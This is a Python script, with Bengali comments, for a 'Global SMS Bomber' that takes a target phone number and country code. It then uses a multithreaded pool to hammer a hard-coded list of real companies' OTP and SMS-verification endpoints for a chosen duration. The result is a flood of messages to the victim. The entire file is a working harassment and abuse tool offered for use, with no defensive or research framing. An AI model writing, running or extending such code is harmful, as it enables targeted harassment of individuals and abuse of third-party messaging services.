import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

class GlobalSMSBomber:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json'
        })
        self.sent_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.countries = self.load_countries()
        self.apis = self.load_embedded_apis()
        
    def load_countries(self):
        """সাপোর্টেড দেশগুলোর লিস্ট"""
        return [
            {"name": "Bangladesh", "code": "880", "flag": "🇧🇩", "format": "01XXXXXXXXX", "sample": "1712345678"},
            {"name": "Saudi Arabia", "code": "966", "flag": "🇸🇦", "format": "5XXXXXXXX", "sample": "501234567"},
            {"name": "India", "code": "91", "flag": "🇮🇳", "format": "9XXXXXXXXX", "sample": "9876543210"},
            {"name": "Russia", "code": "7", "flag": "🇷🇺", "format": "9XXXXXXXXX", "sample": "9123456789"},
            {"name": "United States", "code": "1", "flag": "🇺🇸", "format": "XXXXXXXXXX", "sample": "5551234567"},
            {"name": "United Arab Emirates", "code": "971", "flag": "🇦🇪", "format": "5XXXXXXXX", "sample": "501234567"},
            {"name": "Nepal", "code": "977", "flag": "🇳🇵", "format": "9XXXXXXXXX", "sample": "9841234567"},
            {"name": "Iran", "code": "98", "flag": "🇮🇷", "format": "9XXXXXXXXX", "sample": "9123456789"},
            {"name": "Pakistan", "code": "92", "flag": "🇵🇰", "format": "3XXXXXXXXX", "sample": "3012345678"},
            {"name": "Sri Lanka", "code": "94", "flag": "🇱🇰", "format": "7XXXXXXXX", "sample": "771234567"},
            {"name": "Qatar", "code": "974", "flag": "🇶🇦", "format": "5XXXXXXXX", "sample": "55123456"},
            {"name": "Oman", "code": "968", "flag": "🇴🇲", "format": "9XXXXXXXX", "sample": "92123456"},
            {"name": "Kuwait", "code": "965", "flag": "🇰🇼", "format": "5XXXXXXX", "sample": "50012345"},
            {"name": "Bahrain", "code": "973", "flag": "🇧🇭", "format": "3XXXXXXX", "sample": "36001234"},
            {"name": "Malaysia", "code": "60", "flag": "🇲🇾", "format": "1XXXXXXXX", "sample": "123456789"},
            {"name": "Singapore", "code": "65", "flag": "🇸🇬", "format": "XXXXXXX", "sample": "81234567"},
            {"name": "United Kingdom", "code": "44", "flag": "🇬🇧", "format": "7XXXXXXXXX", "sample": "7123456789"},
            {"name": "Canada", "code": "1", "flag": "🇨🇦", "format": "XXXXXXXXXX", "sample": "5551234567"},
            {"name": "Australia", "code": "61", "flag": "🇦🇺", "format": "4XXXXXXXXX", "sample": "412345678"},
            {"name": "Germany", "code": "49", "flag": "🇩🇪", "format": "1XXXXXXXXX", "sample": "1512345678"},
        ]
    
    def print_banner(self):
        """বেনার প্রিন্ট করে"""
        banner = """
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    ███████ ███    ███ ███████     ███████ ██   ██ ███████     ║
║    ██      ████  ████ ██          ██       ██ ██  ██          ║
║    ███████ ██ ████ ██ █████       █████     ███   █████       ║
║         ██ ██  ██  ██ ██          ██       ██ ██  ██          ║
║    ███████ ██      ██ ███████     ███████ ██   ██ ███████     ║
║                                                                ║
║    🌍 G L O B A L   S M S   B O M B E R   🌍                 ║
║    🔥 International Country Code Supported 🔥                ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def show_country_list(self):
        """দেশের লিস্ট দেখাবে"""
        print("\n" + "="*70)
        print("🌍 SELECT COUNTRY FOR SMS BOMBING")
        print("="*70)
        
        for i, country in enumerate(self.countries, 1):
            print(f"{i:2d}. {country['flag']} {country['name']:20} (+{country['code']}) - Format: {country['format']}")
            print(f"    Example: {country['sample']}")
    
    def select_country(self):
        """দেশ সিলেক্ট করাবে"""
        self.show_country_list()
        
        while True:
            try:
                choice = int(input(f"\n🎯 Select country (1-{len(self.countries)}): "))
                if 1 <= choice <= len(self.countries):
                    selected_country = self.countries[choice-1]
                    print(f"\n✅ Selected: {selected_country['flag']} {selected_country['name']} (+{selected_country['code']})")
                    return selected_country
                else:
                    print("❌ Invalid choice! Please try again.")
            except ValueError:
                print("❌ Please enter a valid number!")
    
    def get_phone_input(self, country):
        """ফোন নম্বর ইনপুট নেবে"""
        print(f"\n📱 Enter phone number for {country['flag']} {country['name']}:")
        print(f"💡 Format: {country['format']} (without country code)")
        print(f"📍 Country Code: +{country['code']}")
        print(f"📞 Example: {country['sample']}")
        
        while True:
            phone = input("📞 Phone: ").strip()
            
            # শুধু নাম্বার চেক
            if not phone.isdigit():
                print("❌ Phone number must contain only digits!")
                continue
            
            # ফোন নম্বর ভ্যালিডেশন
            if not self.validate_phone_number(phone, country):
                continue
                
            full_number = f"+{country['code']}{phone}"
            confirm = input(f"🤔 Confirm: {full_number} ? (y/n): ").lower()
            if confirm in ['y', 'yes']:
                return phone
            else:
                print("🔄 Let's try again...")
    
    def validate_phone_number(self, phone, country):
        """ফোন নম্বর ভ্যালিডেশন"""
        country_name = country['name']
        code = country['code']
        
        # বাংলাদেশ ভ্যালিডেশন
        if country_name == "Bangladesh":
            if not phone.startswith(('01', '01')) or len(phone) != 10:
                print("❌ Bangladeshi numbers must start with 01 and be 10 digits")
                return False
        
        # সৌদি আরব ভ্যালিডেশন
        elif country_name == "Saudi Arabia":
            if not phone.startswith('5') or len(phone) < 8 or len(phone) > 9:
                print("❌ Saudi numbers must start with 5 and be 8-9 digits")
                return False
        
        # ভারত ভ্যালিডেশন
        elif country_name == "India":
            if not phone.startswith(('6', '7', '8', '9')) or len(phone) != 10:
                print("❌ Indian numbers must start with 6,7,8,9 and be 10 digits")
                return False
        
        # USA/Canada ভ্যালিডেশন
        elif country_name in ["United States", "Canada"]:
            if len(phone) != 10:
                print("❌ US/Canada numbers must be 10 digits")
                return False
        
        # রাশিয়া ভ্যালিডেশন
        elif country_name == "Russia":
            if not phone.startswith('9') or len(phone) != 10:
                print("❌ Russian numbers must start with 9 and be 10 digits")
                return False
        
        # UAE ভ্যালিডেশন
        elif country_name == "United Arab Emirates":
            if not phone.startswith('5') or len(phone) != 9:
                print("❌ UAE numbers must start with 5 and be 9 digits")
                return False
                
        return True
    
    def load_embedded_apis(self):
        """এম্বেডেড API লোড করে"""
        return [
            # বাংলাদেশ API গুলো
            {"name": "Bikroy BD", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", "method": "POST", "data": {"phone": "{phone}"}},
            {"name": "Grameenphone", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "method": "POST", "data": {"msisdn": "{phone}"}},
            {"name": "Robi BD", "url": "https://webapi.robi.com.bd", "method": "POST", "data": {"msisdn": "{phone}"}},
            {"name": "Banglalink", "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request", "method": "POST", "data": {"msisdn": "{phone}"}},
            {"name": "Airtel BD", "url": "https://www.bd.airtel.com/en/auth/login:alif", "method": "POST", "data": {"phone": "{phone}"}},
            
            # সৌদি আরব API
            {"name": "Amazon KSA", "url": "https://www.amazon.sa/ap/cvf/verify", "method": "POST", "data": {"phoneNumber": "{phone}"}},
            {"name": "Shein KSA", "url": "https://ar.shein.com/bff-api/user/account/send_sms_code?_ver=1.1.8&_lang=ar", "method": "POST", "data": {"phone": "{phone}"}},
            
            # ভারত API গুলো
            {"name": "Paytm India", "url": "https://commonfront.paytm.com/v4/api/sendsms", "method": "POST", "data": {"phoneNumber": "{phone}"}},
            {"name": "Pharmeasy IN", "url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "data": {"mobile": "{phone}"}},
            {"name": "Dream11 IN", "url": "https://api.dream11.com/sendsmslink", "method": "POST", "data": {"phone": "{phone}"}},
            
            # রাশিয়া API গুলো
            {"name": "Yandex RU", "url": "https://eda.yandex/api/v1/user/request_authentication_code", "method": "POST", "data": {"phone_number": "{phone}"}},
            {"name": "IVI Russia", "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6", "method": "POST", "data": {"phone": "{phone}"}},
            {"name": "Tinder RU", "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", "method": "POST", "data": {"phone_number": "{phone}"}},
            
            # USA API
            {"name": "Tinder US", "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en", "method": "POST", "data": {"phone_number": "{phone}"}},
            
            # UAE API
            {"name": "UAE Service", "url": "https://api.sunlight.net/v3/customers/authorization/", "method": "POST", "data": {"phone": "{phone}"}},
            
            # ইউরোপ API
            {"name": "Tinder UK", "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en-GB", "method": "POST", "data": {"phone_number": "{phone}"}},
            
            # গ্লোবাল API গুলো
            {"name": "Global-1", "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms", "method": "POST", "data": {"phone_number": "{phone}"}},
            {"name": "Global-2", "url": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone}", "method": "GET"},
            {"name": "Global-3", "url": "https://api.delitime.ru/api/v2/signup", "method": "POST", "data": {"phone": "{phone}"}},
        ]
    
    def format_phone_with_country_code(self, phone_part, country_code):
        """কান্ট্রি কোড সহ ফোন নম্বর ফরম্যাট করে"""
        # শুধু সংখ্যা রাখে
        phone_part = ''.join(filter(str.isdigit, phone_part))
        
        # কান্ট্রি কোড যোগ করে ফুল ইন্টারন্যাশনাল নম্বর তৈরি
        full_phone = country_code + phone_part
        
        return full_phone
    
    def send_single_sms(self, api, phone):
        """একটি SMS দ্রুত পাঠায়"""
        try:
            # API URL এ ফুল ইন্টারন্যাশনাল নম্বর বসায়
            url = api['url'].replace('{phone}', phone)
            method = api.get('method', 'POST')
            
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=6)
            else:
                data = api.get('data', {})
                if data:
                    processed_data = {}
                    for key, value in data.items():
                        if isinstance(value, str):
                            processed_data[key] = value.replace('{phone}', phone)
                        else:
                            processed_data[key] = value
                    response = self.session.post(url, json=processed_data, timeout=6)
                else:
                    response = self.session.post(url, data={'phone': phone}, timeout=6)
            
            success = response.status_code in [200, 201, 202]

            with self.lock:
                if success:
                    self.sent_count += 1
                    print(f"✅ [{self.sent_count}] SMS to {phone} via {api['name']}")
                    return True
                else:
                    self.failed_count += 1
                    print(f"❌ Failed: {api['name']} to {phone}")
                    return False
                    
        except Exception as e:
            with self.lock:
                self.failed_count += 1
                print(f"⚠️ Error: {api['name']} to {phone}")
            return False

    def start_bombing(self, phone_part, country, max_workers=50, duration=60):
        """বোম্বিং শুরু করে"""
        # কান্ট্রি কোড সহ ফুল নম্বর তৈরি
        full_phone = self.format_phone_with_country_code(phone_part, country['code'])
        
        print(f"""
    🌍 GLOBAL SMS BOMBER STARTED
    📍 Country: {country['flag']} {country['name']}
    📱 Target: +{full_phone}
    🚀 Workers: {max_workers}
    ⏰ Duration: {duration} seconds
    📧 Total APIs: {len(self.apis)}
        """)
        
        start_time = time.time()
        total_requests = 0
        
        print("🎯 Starting bombardment in 3 seconds...")
        time.sleep(3)
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            while time.time() - start_time < duration:
                futures = []
                for api in random.sample(self.apis, min(15, len(self.apis))):
                    future = executor.submit(self.send_single_sms, api, full_phone)
                    futures.append(future)
                
                for future in as_completed(futures[:3]):
                    future.result()
                
                total_requests += len(futures)
                
                elapsed = time.time() - start_time
                rate = self.sent_count / elapsed if elapsed > 0 else 0
                
                print(f"\r📊 LIVE: Sent {self.sent_count} | Failed {self.failed_count} | Rate {rate:.1f}/s | Time {int(elapsed)}s/{duration}s", 
                      end="", flush=True)
                
                time.sleep(0.05)
        
        print(f"""
    
    🎯 MISSION COMPLETED!
    ╔══════════════════════════════════════╗
    ║              RESULTS                 ║
    ╠══════════════════════════════════════╣
    ║ 📍 Country: {country['name']:20} ║
    ║ 📱 Number: +{full_phone:20} ║
    ║ ✅ Successful SMS: {self.sent_count:8d} ║
    ║ ❌ Failed: {self.failed_count:8d}       ║  
    ║ 📨 Total Requests: {total_requests:8d} ║
    ║ ⚡ Average Rate: {self.sent_count/max(duration,1):6.1f} SMS/s   ║
    ╚══════════════════════════════════════╝
        """)

def main():
    bomber = GlobalSMSBomber()
    bomber.print_banner()
    
    # দেশ সিলেক্ট
    country = bomber.select_country()
    
    # ফোন নম্বর ইনপুট
    phone_part = bomber.get_phone_input(country)
    
    # সেটিংস
    try:
        workers = int(input("\n🚀 Enter number of workers [50]: ") or "50")
        duration = int(input("⏰ Enter duration in seconds [60]: ") or "60")
    except:
        workers, duration = 50, 60
    
    print(f"\n🔧 Final Configuration:")
    print(f"   🌍 Country: {country['flag']} {country['name']}")
    print(f"   📱 Full Number: +{country['code']}{phone_part}")
    print(f"   ⚡ Workers: {workers}")
    print(f"   ⏰ Duration: {duration}s")
    
    confirm = input("\n🚀 Start bombing? (y/n): ").lower()
    if confirm in ['y', 'yes']:
        bomber.start_bombing(phone_part, country, workers, duration)
    else:
        print("❌ Operation cancelled!")

if __name__ == "__main__":
    main()
